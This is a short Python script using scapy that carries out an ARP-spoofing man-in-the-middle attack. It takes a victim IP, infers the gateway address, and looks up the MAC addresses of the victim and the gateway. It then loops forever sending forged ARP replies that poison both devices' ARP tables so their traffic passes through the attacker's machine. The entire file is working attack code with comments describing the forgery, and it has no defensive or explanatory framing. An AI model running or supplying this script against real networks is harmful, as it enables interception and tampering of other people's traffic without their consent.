#!/usr/bin/python3

#running command: python MITM.py victimIP

import sys  #for command line argument
import time
from random import randint
from scapy.all import *
from scapy.layers.inet import *
import scapy
import socket
import uuid 


s = conf.L2socket(iface="enp3s0")	#for optimization

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('192.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

#==============================================================
# Collect Necessary Information 
#==============================================================

my_ip = get_ip()

my_mac = str(':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
for ele in range(0,8*6,8)][::-1])) 

print("my_ip : " + my_ip)
print("my_mac : " + my_mac)

victim_ip = sys.argv[1]


network_parts = str(victim_ip).split(".")
gateway_ip = network_parts[0]+"."+network_parts[1]+"."+network_parts[2]+".1" 


# print(str(my_ip) + " " + str(victim_ip) + " " + gateway)


arp_packet = ARP(op=ARP.who_has, 	#request mac
	psrc=my_ip, 					#request to reply to attacker
	pdst=victim_ip)					#IP of the mac attacker needs
result = sr1(arp_packet)			#reply packet
victim_mac = result[ARP].hwsrc		#mac of victim
print("victim_ip : " + str(victim_ip))
print("victim_mac : " + str(victim_mac))

arp_packet = ARP(op=ARP.who_has,	#request mac
	psrc=my_ip,						#request to reply to attacker
	pdst=gateway_ip)				#IP of the mac attacker needs
result = sr1(arp_packet)			#reply packet
gateway_mac = result[ARP].hwsrc		#mac of gateway
print("gateway_ip : " + str(gateway_ip))
print("gateway_mac : " + str(gateway_mac))

print()


#==============================================================
# Create ARP Spoofing Packets
#==============================================================

reply1 = ARP(op=ARP.is_at, 			#forging arp reply
	hwsrc=my_mac, 					#sending attacker's mac as victim's
	psrc=victim_ip, 				#victim's IP point to attacker's mac
	hwdst=gateway_mac, 				#telling gateway
	pdst=gateway_ip)				#gateway IP

go1 = Ether(dst=gateway_mac, 		#sending to gateway
	src=my_mac) / reply1			#origin at attacker's mac


reply2 = ARP(op=ARP.is_at, 			#forging arp reply
	hwsrc=my_mac, 					#sending attacker's mac as gateways's
	psrc=gateway_ip, 				#gateway's IP point to attacker's mac
	hwdst=victim_mac, 				#telling victim
	pdst=victim_ip)					#victim IP

go2 = Ether(dst=victim_mac, 		#sending to victim
	src=my_mac) / reply2			#origin at attacker's mac



#==============================================================
# Change MAC in ARP Tables of the Gateway and the Victim
#==============================================================

i = 0

while  1:
	i = i+1
	print("ARP SPOOFING #" + str(i))
	
	print(go1.summary())
	s.send(go1)						#send ARP packet to gateway
	
	print(go2.summary())
	s.send(go2)						#send ARP packet to victim
	
	print()
	
	time.sleep(randint(5, 10))		#random sleep
									#otherwise too much traffic